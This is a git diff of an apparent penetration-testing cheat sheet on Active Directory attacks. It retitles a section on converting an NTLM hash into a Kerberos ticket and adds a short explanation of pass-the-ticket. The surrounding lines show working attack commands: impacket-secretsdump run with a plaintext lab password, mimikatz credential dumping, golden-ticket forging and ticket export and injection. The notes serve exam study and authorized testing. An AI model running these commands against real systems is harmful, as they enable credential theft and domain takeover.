@@ -326,7 +326,7 @@ impacket-secretsdump celia.almeda:7k8XHk3dMtmpnC7@10.10.96.142 -sam SAM -system 
 impacket-secretsdump celia.almeda@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt -hashes lm:nt
 ```
 
-#### Converted NTLM hash into a Kerberos TGT and leveraged that to gain remote code execution
+#### Abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket(TGT) and gain rce
 https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
 ```
 sekurlsa::logonpasswords
@@ -346,6 +346,9 @@ kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-27875233
 kerberos::list
 ```
 #### Pass the ticket
+>In this attack, an attacker intercepts and steals a valid ticket-granting ticket (TGT) or service ticket (TGS) from a compromised user or service account.
+
+>The attacker then "passes" this stolen ticket to authenticate themselves as the compromised user or service without needing to know the account's password.
 ```
 sekurlsa::tickets /export (export all kirbi files)
 kerberos::ptt [0;3e7]-0-0-40a00000-ted@krbtgt-web01.exam.com-exam.com.kirbi (load into memory)
